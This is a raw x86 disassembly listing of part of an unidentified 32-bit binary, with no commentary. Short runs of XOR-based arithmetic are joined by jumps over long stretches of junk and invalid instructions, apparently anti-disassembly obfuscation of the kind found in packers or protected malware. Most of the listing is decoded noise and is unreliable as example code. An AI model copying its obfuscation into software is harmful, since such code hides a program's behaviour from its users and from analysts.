  40c057:	pop    esi
  40c058:	xor    WORD PTR [eax],bx
  40c05b:	shl    DWORD PTR [edx+esi*1+0x509fc75a],1
  40c062:	or     dh,BYTE PTR [ecx]
  40c064:	add    ebx,DWORD PTR [esi-0x674f7988]
  40c06a:	es mov bl,0xcf
  40c06d:	pop    ebx
  40c06e:	jno    0x40c0b1
  40c070:	sbb    BYTE PTR [ecx-0x76],0x45
  40c074:	outs   dx,DWORD PTR ds:[esi]
  40c075:	mov    al,0x81
  40c077:	sti    
  40c078:	fisttp WORD PTR [esi-0x5d]
  40c07b:	leave  
  40c07c:	inc    eax
  40c07d:	cld    
  40c07e:	xchg   DWORD PTR [esi+eiz*2+0x510859b9],ebx
  40c085:	pop    es
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	inc    ecx
  40c0e1:	out    0x61,eax
  40c0e3:	push   0x7e7e35e1
  40c0e8:	mov    dh,0x7e
  40c0ea:	jle    0x40c16a
  40c0ec:	xor    al,0xae
  40c0ee:	repnz add DWORD PTR [esi],edx
  40c0f1:	sub    DWORD PTR [ebp+0x68b61b0e],0x7c
  40c0f8:	loopne 0x40c0ca
  40c0fa:	stc    
  40c0fb:	adc    eax,0x11857cdc
  40c100:	sahf   
  40c101:	(bad)  
  40c102:	sub    eax,0xb8882725
  40c107:	mov    BYTE PTR [esi+edx*1],bh
  40c10a:	outs   dx,BYTE PTR ds:[esi]
  40c10b:	push   cs
  40c10c:	xlat   BYTE PTR ds:[ebx]
  40c10d:	in     eax,dx
  40c10e:	mov    al,0x6b
  40c110:	stc    
  40c111:	ss daa 
  40c113:	out    0x95,eax
  40c115:	ret    
  40c116:	popa   
  40c117:	dec    edx
  40c118:	dec    ebp
  40c119:	popa   
  40c11a:	scas   al,BYTE PTR es:[edi]
  40c11b:	pusha  
  40c11c:	cwde   
  40c11d:	push   0x820e91e2
  40c122:	shl    BYTE PTR [edi-0x33f46907],0x4a
  40c129:	jge    0x40c148
  40c12b:	loopne 0x40c125
  40c12d:	inc    ebp
  40c12e:	pop    ebp
  40c12f:	std    
  40c130:	lahf   
  40c131:	clc    
  40c132:	loopne 0x40c0da
  40c134:	sub    BYTE PTR [eax-0x67286092],ah
  40c13a:	stos   BYTE PTR es:[edi],al
  40c13b:	or     dl,BYTE PTR [ecx-0x6daf27a5]
  40c141:	in     eax,dx
  40c142:	and    bl,BYTE PTR [ebp-0x7d]
  40c145:	test   DWORD PTR [ebx-0x32],ecx
  40c148:	ret    
  40c149:	push   cs
  40c14a:	sbb    BYTE PTR [edi],cl
  40c14c:	lds    esi,FWORD PTR [ebp+0x32]
  40c14f:	and    edi,DWORD PTR [eax]
  40c151:	or     BYTE PTR [esi+0x2aeb46c8],al
  40c157:	jnp    0x40c0ef
  40c159:	inc    edi
  40c15a:	ds mov al,0x95
  40c15d:	pusha  
  40c15e:	js     0x40c1b1
  40c160:	ret    
  40c161:	ret    0x22da
  40c164:	sbb    BYTE PTR [esi-0x32f86e90],al
  40c16a:	pop    eax
  40c16b:	dec    esp
  40c16c:	nop
  40c16d:	lahf   
  40c16e:	adc    BYTE PTR [ecx+0x5b8526f0],0x4c
  40c175:	or     DWORD PTR [ecx-0x5b],esi
  40c178:	mov    eax,ds
  40c17a:	loopne 0x40c1e2
  40c17c:	jno    0x40c1ae
  40c17e:	mov    esp,0x5b6cbd25
  40c183:	adc    BYTE PTR [ebx-0x77bed9c0],bh
  40c189:	xor    bh,bh
  40c18b:	jecxz  0x40c10d
  40c18d:	repnz sbb al,0x76
  40c190:	pop    ds
  40c191:	lods   eax,DWORD PTR ds:[esi]
  40c192:	loope  0x40c198
  40c194:	push   eax
  40c195:	les    edi,FWORD PTR [ebx+eax*2-0x3e9806d7]
  40c19c:	mov    ecx,0xc2d888ac
  40c1a1:	lods   al,BYTE PTR ds:[esi]
  40c1a2:	add    BYTE PTR [ecx],al
  40c1a4:	add    al,0x2
  40c1a6:	adc    ecx,edx
  40c1a8:	out    0x8f,eax
  40c1aa:	ret    0x29f8
  40c1ad:	cli    
  40c1ae:	mul    DWORD PTR [edx+0x5a]
  40c1b1:	jo     0x40c210
  40c1b3:	ror    BYTE PTR [ebp+0x729f0a8c],1
  40c1b9:	xor    al,BYTE PTR [eax]
  40c1bb:	cmp    ecx,eax
  40c1bd:	jne    0x40bf8f
  40c1c3:	mov    ebx,esi
  40c1c5:	jmp    0x40c2b4
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx+0x4be3b97e]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	jmp    FWORD PTR [ecx-0x35]
  40c1ef:	fild   DWORD PTR [ebx+0x1cbe56d4]
  40c1f5:	sbb    BYTE PTR [edx],cl
  40c1f7:	leave  
  40c1f8:	fld    QWORD PTR [eax]
  40c1fa:	test   eax,0xb1de15b
  40c1ff:	repz pop es
  40c201:	push   cs
  40c202:	pop    esi
  40c203:	mov    ah,0xe2
  40c205:	push   ds
  40c206:	jne    0x40c1fe
  40c208:	pop    ecx
  40c209:	mov    ecx,0xc274e51b
  40c20e:	or     DWORD PTR [ecx],esp
  40c210:	add    ah,BYTE PTR [eax]
  40c212:	lods   eax,DWORD PTR ds:[esi]
  40c213:	mov    ds:0xdd413217,eax
  40c218:	pop    edx
  40c219:	cli    
  40c21a:	je     0x40c1ce
  40c21c:	adc    al,0xc6
  40c21e:	mov    esi,0x7035f445
  40c223:	fs daa 
  40c225:	mov    ds,WORD PTR [ebx+edx*4-0x22a9ecdc]
  40c22c:	into   
  40c22d:	loop   0x40c27b
  40c22f:	pop    edx
  40c230:	mov    ds:0x7f4f9195,al
  40c235:	gs xor al,0x9e
  40c238:	loope  0x40c21f
  40c23a:	pop    edi
  40c23b:	mov    dl,0x3c
  40c23d:	jne    0x40c1fe
  40c23f:	jns    0x40c27c
  40c241:	adc    al,BYTE PTR gs:[ecx+0x70]
  40c245:	or     BYTE PTR [edi-0x4f],bl
  40c248:	stc    
  40c249:	jge    0x40c21b
  40c24b:	push   ss
  40c24c:	test   DWORD PTR [esi+0x5c],eax
  40c24f:	and    DWORD PTR [esi],0xaf49e1c6
  40c255:	xor    ecx,0x2b930b75
  40c25b:	jl     0x40c276
  40c25d:	(bad)  
  40c25f:	mov    cl,0x82
  40c261:	mov    al,0x84
  40c263:	addr16 into 
  40c265:	aas    
  40c266:	xor    dl,bl
  40c268:	push   ecx
  40c269:	pop    esp
  40c26a:	faddp  st(7),st
  40c26c:	or     ecx,DWORD PTR [esi]
  40c26e:	int3   
  40c26f:	fwait
  40c270:	push   edx
  40c271:	shl    DWORD PTR [edx+0x6c],cl
  40c274:	popf   
  40c275:	push   ecx
  40c276:	mov    al,ds:0x92bfc5c3
  40c27b:	stos   BYTE PTR es:[edi],al
  40c27c:	or     BYTE PTR [esi+0x1d25429d],0xc6
  40c283:	push   ebx
  40c284:	ja     0x40c241
  40c286:	pop    ds
  40c287:	adc    ah,BYTE PTR [eax]
  40c289:	cmp    BYTE PTR [edi+0x77e15080],bh
  40c28f:	enter  0x6148,0x17
  40c293:	call   0xdd56:0x16454925
  40c29a:	ins    BYTE PTR es:[edi],dx
  40c29b:	cmp    eax,0x8677b30c
  40c2a0:	cmp    dl,cl
  40c2a2:	push   ds
  40c2a3:	adc    eax,0x990e08db
  40c2a8:	mov    edx,edx
  40c2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2ab:	mov    WORD PTR [edx+0x7e69396],ds
  40c2b1:	xor    BYTE PTR [edx-0x48],cl
  40c2b4:	mov    eax,DWORD PTR [ebp-0x4]
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	sbb    edx,esi
  40c2db:	jo     0x40c2be
  40c2dd:	jno    0x40c2aa
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	add    al,0xae
  40c2e7:	out    dx,eax
  40c2e8:	mov    DWORD PTR [ecx],edi
  40c2ea:	mov    bl,0xa1
  40c2ec:	fst    DWORD PTR [edi]
  40c2ee:	pop    edx
  40c2ef:	cwde   
  40c2f0:	pop    ss
  40c2f1:	shl    DWORD PTR [esp+ecx*2],1
  40c2f4:	xchg   esi,eax
  40c2f5:	sub    eax,0x2102dc79
  40c2fa:	mov    ah,0xb2
  40c2fc:	dec    esp
  40c2fd:	scas   al,BYTE PTR es:[edi]
  40c2fe:	xor    al,0x65
  40c300:	(bad)  
  40c301:	mov    bh,0xdd
  40c303:	ins    BYTE PTR es:[edi],dx
  40c304:	(bad)  
  40c305:	mov    ah,0x55
  40c307:	jecxz  0x40c355
  40c309:	pop    DWORD PTR [esi+0x4b7b7bb9]
  40c30f:	mov    ch,dh
  40c311:	bound  edi,QWORD PTR [ebx]
  40c313:	xchg   ebp,edx
  40c315:	jecxz  0x40c313
  40c317:	xchg   esi,eax
  40c318:	fild   DWORD PTR [edi]
  40c31a:	inc    esp
  40c31b:	pop    ecx
  40c31c:	pop    ss
  40c31d:	and    DWORD PTR [ebp+0x60],edx
  40c320:	sub    al,0xb1
  40c322:	xchg   esp,eax
  40c323:	jle    0x40c389
  40c325:	mov    esi,0xa1c34725
  40c32a:	or     al,0xa3
  40c32c:	fmul   QWORD PTR [eax]
  40c32e:	dec    ecx
  40c32f:	popa   
  40c330:	loop   0x40c2e3
  40c332:	add    al,0xd5
  40c334:	ffree  st(0)
  40c336:	idiv   DWORD PTR [eax+ebp*1-0x2643dd89]
  40c33d:	mov    DWORD PTR [eax+0x62],eax
  40c340:	push   edx
  40c341:	fwait
  40c342:	in     eax,dx
  40c343:	ret    0xb171
  40c346:	jne    0x40c3b2
  40c348:	push   0xd4bd4d75
  40c34d:	pushf  
  40c34e:	dec    eax
  40c34f:	loope  0x40c315
  40c351:	test   DWORD PTR [edi+0x320750c6],edi
  40c357:	ins    BYTE PTR es:[edi],dx
  40c358:	enter  0xa068,0xeb
  40c35c:	je     0x40c36a
  40c35e:	or     edi,DWORD PTR [ecx+ecx*1-0x15afb393]
  40c365:	dec    ebp
  40c366:	pop    esi
  40c367:	mov    ds:0x563e8a41,eax
  40c36c:	sbb    DWORD PTR [ebp+0x7b],eax
  40c36f:	pusha  
  40c370:	rcr    DWORD PTR ds:0xe3db8c24,1
  40c376:	ja     0x40c378
  40c378:	in     eax,dx
  40c379:	push   ds
  40c37a:	or     BYTE PTR [ebx+0x5af9a582],dh
  40c380:	adc    BYTE PTR [eax+ebx*8],al
  40c383:	jg     0x40c309
  40c385:	inc    edi
  40c386:	sub    ecx,DWORD PTR gs:[edi-0x650a7a5c]
  40c38d:	call   0xca5bb698
  40c392:	sub    DWORD PTR [edx],ebp
  40c394:	mov    edi,0xa2d08cd6
  40c399:	ins    BYTE PTR es:[edi],dx
  40c39a:	jbe    0x40c399
  40c39c:	outs   dx,BYTE PTR ds:[esi]
  40c39d:	inc    edx
  40c39e:	je     0x40c3bf
  40c3a0:	pushf  
  40c3a1:	je     0x40c409
  40c3a3:	and    BYTE PTR [edx+edx*1],al
  40c3a6:	and    BYTE PTR [edx],bl
  40c3a8:	xor    BYTE PTR [edx-0x73],al
  40c3ab:	fmul   DWORD PTR [ecx-0x1]
  40c3ae:	shl    DWORD PTR [ebx],cl
  40c3b0:	fucomi st,st(1)
  40c3b2:	loopne 0x40c3b4
  40c3b4:	add    BYTE PTR [eax],al
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0x532e5fee,ecx
  40c3c3:	nop
  40c3c4:	jno    0x40c3ba
  40c3c6:	dec    ecx
  40c3c7:	retf   
  40c3c8:	jle    0x40c448
  40c3ca:	mov    dh,0x7e
  40c3cc:	jle    0x40c44c
  40c3ce:	dec    edi
  40c3cf:	cmp    al,0x5f
  40c3d1:	cmc    
  40c3d2:	pop    edi
  40c3d3:	jbe    0x40c3af
  40c3d5:	lock pop ecx
  40c3d7:	out    dx,eax
  40c3d8:	mov    ebp,0x442b247b
  40c3dd:	mov    WORD PTR [edx],cs
  40c3df:	and    ebp,ebx
  40c3e1:	(bad)  
  40c3e2:	in     al,dx
  40c3e3:	div    DWORD PTR [ebx+0x733441fb]
  40c3e9:	in     al,0x25
  40c3eb:	punpckldq mm0,DWORD PTR [edx+eax*1+0xaba2d50]
  40c3f3:	pop    eax
  40c3f4:	enter  0xb7ac,0x9f
  40c3f8:	ror    dl,1
  40c3fa:	int    0xac
  40c3fc:	push   es
  40c3fd:	ins    DWORD PTR es:[edi],dx
  40c3fe:	repz fdiv st,st(0)
  40c401:	retf   0x11f2
  40c404:	xor    ebp,DWORD PTR [eax+0x62]
  40c407:	retf   0x493e
  40c40a:	xchg   ecx,eax
  40c40b:	(bad)
  40c40e:	or     BYTE PTR ds:0x1eb64472,dl
  40c414:	enter  0x73a7,0x81
  40c418:	popa   
  40c419:	jmp    0xa878:0x629df230
  40c420:	lock xchg esp,eax
  40c422:	mov    ebx,0x3380ac06
  40c427:	cs inc ecx
  40c429:	mov    bl,0x1e
  40c42b:	loop   0x40c405
  40c42d:	lds    ebp,FWORD PTR ds:0x18bc1645
  40c433:	pop    ebp
  40c434:	pop    eax
  40c435:	xchg   esp,eax
  40c436:	xchg   BYTE PTR [edi+0x76],ah
  40c439:	or     esi,DWORD PTR [ebp+0x437bfc89]
  40c43f:	or     DWORD PTR [edi-0x4e],ebp
  40c442:	xor    DWORD PTR [edi+0x1],0x3b
  40c446:	add    bl,BYTE PTR [ecx+ebp*1]
  40c449:	pop    es
  40c44a:	popf   
  40c44b:	das    
  40c44c:	(bad)  
  40c44d:	jp     0x40c493
  40c44f:	fiadd  DWORD PTR [ebp+0xe00d948]
  40c455:	mov    ds:0xa5910ca,al
  40c45a:	fdivr  DWORD PTR [eax-0x64]
  40c45d:	cmp    ebx,DWORD PTR [eax+0x34]
  40c460:	and    al,0x2b
  40c462:	xchg   ebx,eax
  40c463:	jge    0x40c4a8
  40c465:	or     ebx,DWORD PTR [esp+edx*4-0x4b]
  40c469:	and    edx,0x98c55daf
  40c46f:	jmp    0x81abf134
  40c474:	(bad)  
  40c475:	icebp  
  40c476:	jbe    0x40c3fd
  40c478:	leave  
  40c479:	mov    edx,0xd8637aff
  40c47e:	imul   edx
  40c480:	push   ebp
  40c481:	lea    esp,[ebp-0x63ebc955]
  40c487:	outs   dx,DWORD PTR ds:[esi]
  40c488:	iret   
  40c489:	or     bh,cl
  40c48b:	test   DWORD PTR [edx-0x5b65506a],ebp
  40c491:	out    0x99,eax
  40c493:	js     0x40c452
  40c495:	sub    eax,DWORD PTR [ebx+0x39]
  40c498:	pop    ebp
  40c499:	adc    cl,ch
  40c49b:	loopne 0x40c49d
  40c49d:	add    BYTE PTR [eax],al
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	gs inc esp
  40c4ac:	out    0xa6,eax
  40c4ae:	loop   0x40c431
  40c4b0:	enter  0x7e7e,0xb6
  40c4b4:	jle    0x40c534
  40c4b6:	jle    0x40c479
  40c4b8:	pop    esi
  40c4b9:	fadd   st,st(0)
  40c4bb:	adc    al,0xeb
  40c4bd:	arpl   di,si
  40c4bf:	sti    
  40c4c0:	push   esp
  40c4c1:	mov    ch,0x61
  40c4c3:	mov    ds:0x179faf58,al
  40c4c8:	push   esp
  40c4c9:	mov    dh,0x64
  40c4cb:	adc    eax,0xd49a3467
  40c4d0:	cmp    eax,0x3f7f4492
  40c4d5:	and    esp,DWORD PTR [ebx-0x44]
  40c4d8:	fdiv   DWORD PTR [eax]
  40c4da:	mov    al,0xae
  40c4dc:	iret   
  40c4dd:	jne    0x40c54c
  40c4df:	mov    edx,0xb89d8d80
  40c4e4:	test   al,0xad
  40c4e6:	aad    0x4e
  40c4e8:	(bad)  [edx+0x1b]
  40c4eb:	push   0x39f3276a
  40c4f0:	fucomi st,st(5)
  40c4f2:	in     al,dx
  40c4f3:	mov    dl,0xaa
  40c4f5:	shl    bh,cl
  40c4f7:	test   BYTE PTR [esi-0x448d962e],bl
  40c4fd:	ins    BYTE PTR es:[edi],dx
  40c4fe:	outs   dx,DWORD PTR ds:[esi]
  40c4ff:	push   esp
  40c500:	retf   0x4d5a
  40c503:	sbb    cl,bh
  40c505:	retf   
  40c506:	pop    edi
  40c507:	pavgb  mm1,mm0
  40c50a:	inc    ax
  40c50c:	add    DWORD PTR [ecx+0x3a38948d],esi
  40c512:	xor    BYTE PTR [ebx+0x5493e6c8],al
  40c518:	lods   eax,DWORD PTR ds:[esi]
  40c519:	add    al,0x32
  40c51b:	rol    ecx,cl
  40c51d:	mov    edi,0xd1ffdf72
  40c522:	push   ecx
  40c523:	or     BYTE PTR [ebp+0xf462379],al
  40c529:	popf   
  40c52a:	xor    BYTE PTR [eax],ch
  40c52c:	or     al,0xab
  40c52e:	shr    BYTE PTR [edi-0x69],1
  40c531:	mov    DWORD PTR [eax-0x186a7c72],edi
  40c537:	inc    esi
  40c538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c539:	xor    al,0x99
  40c53b:	push   edi
  40c53c:	ins    BYTE PTR es:[edi],dx
  40c53d:	jmp    0xc0bd7868
  40c542:	jno    0x40c573
  40c544:	out    dx,al
  40c545:	iret   
  40c546:	addr16 loope 0x40c59b
  40c549:	sbb    dh,BYTE PTR [ecx+0x5d]
  40c54c:	mov    esi,0xf041cafa
  40c551:	push   edx
  40c552:	and    BYTE PTR [ebx-0x2aee76a9],ah
  40c558:	sub    DWORD PTR [eax-0x5b],esi
  40c55b:	pop    ebp
  40c55c:	mov    esi,0x6c63f651
  40c561:	jo     0x40c518
  40c563:	push   esi
  40c564:	pop    ecx
  40c565:	jo     0x40c58f
  40c567:	dec    ebx
  40c568:	mov    bl,0x23
  40c56a:	adc    esi,edx
  40c56c:	mov    WORD PTR [ecx-0x5f],fs
  40c56f:	leave  
  40c570:	imul   ebp,DWORD PTR [ebx+0x18f4de31],0x67
  40c577:	add    BYTE PTR [edx+0x5d],0x65
  40c57b:	xlat   BYTE PTR ds:[ebx]
  40c57c:	mov    esp,0x840f9cd4
  40c581:	std    
  40c582:	add    BYTE PTR [eax],al
  40c584:	add    BYTE PTR [edx+0x6a590a6a],dl
  40c58a:	add    al,0x5b
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0x4408bfd6
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	mov    es,WORD PTR [ebx]
  40c5b2:	mov    DWORD PTR [ecx+0x1fc4bf07],edi
  40c5b8:	dec    edx
  40c5b9:	sub    eax,DWORD PTR [esi-0xc]
  40c5bc:	ret    
  40c5bd:	sub    DWORD PTR [esi+eiz*8],ebx
  40c5c0:	mov    ds:0x89ce08a6,al
  40c5c5:	cwde   
  40c5c6:	call   0x7589:0x48f44db9
  40c5cd:	js     0x40c64b
  40c5cf:	pop    ss
  40c5d0:	inc    ebx
  40c5d1:	xchg   esi,eax
  40c5d2:	push   eax
  40c5d3:	mov    ch,0xc2
  40c5d5:	push   ebp
  40c5d6:	cmp    dh,BYTE PTR [ebp+0x65]
  40c5d9:	sub    BYTE PTR [ebx+0x2f7ddb98],0x4
  40c5e0:	call   ecx
  40c5e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5e3:	jne    0x40c58a
  40c5e5:	clc    
  40c5e6:	and    eax,0x715dfdc0
  40c5eb:	and    dh,BYTE PTR [esi+ebx*2+0x6f]
  40c5ef:	call   0x701b:0x9a8ca6
  40c5f6:	int    0x32
  40c5f8:	in     eax,0x30
  40c5fa:	fwait
  40c5fb:	add    al,0x75
  40c5fd:	ja     0x40c58c
  40c5ff:	fcom   DWORD PTR [ecx]
  40c601:	(bad)  
  40c602:	mov    edx,0xbb65d196
  40c607:	jecxz  0x40c667
  40c609:	xor    esi,ebx
  40c60b:	inc    ebx
  40c60c:	dec    ebx
  40c60d:	(bad)  
  40c60e:	fwait
  40c60f:	stos   DWORD PTR es:[edi],eax
  40c610:	mov    DWORD PTR [edx-0x320624ed],ecx
  40c616:	repnz out 0x76,al
  40c619:	aam    0x12
  40c61b:	std    
  40c61c:	cmc    
  40c61d:	rcl    DWORD PTR [esi*4+0x71e282a4],0x61
  40c625:	out    0xd6,al
  40c627:	mov    WORD PTR [esi],es
  40c629:	jb     0x40c68e
  40c62b:	sub    BYTE PTR [eax+ebp*1-0x5d],ch
  40c62f:	xchg   edx,eax
  40c630:	xor    cl,BYTE PTR [ebp+0x15]
  40c633:	cmp    BYTE PTR [edi],al
  40c635:	push   cs
  40c636:	clc    
  40c637:	jb     0x40c63a
  40c639:	xchg   edi,eax
  40c63a:	iret   
  40c63b:	sub    bl,BYTE PTR [ecx+0x68be8434]
  40c641:	sbb    eax,0xf36a18eb
  40c646:	xor    esi,edi
  40c648:	lods   al,BYTE PTR ds:[esi]
  40c649:	cmc    
  40c64a:	add    al,BYTE PTR [eax+0x7ba10c6f]
  40c650:	mov    esp,0x1aa9f89e
  40c655:	sub    DWORD PTR [edx],ecx
  40c657:	and    al,0x72
  40c659:	sub    al,0x4a
  40c65b:	mov    eax,0xf35a0bb5
  40c660:	add    edx,eax
  40c662:	cmp    DWORD PTR [ebx-0x58],ebp
  40c665:	xor    al,0xc2
  40c667:	scas   al,BYTE PTR es:[edi]
  40c668:	sbb    DWORD PTR [ecx+eax*8],0x21260af2
  40c66f:	mov    ss,WORD PTR [eax+0x45]
  40c672:	in     al,dx
  40c673:	xchg   DWORD PTR [esi-0x1f],ecx
  40c676:	ret    0x4902
  40c679:	mov    eax,DWORD PTR [ebp-0x1c]
  40c67c:	imul   eax,ecx
  40c67f:	add    esp,eax
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
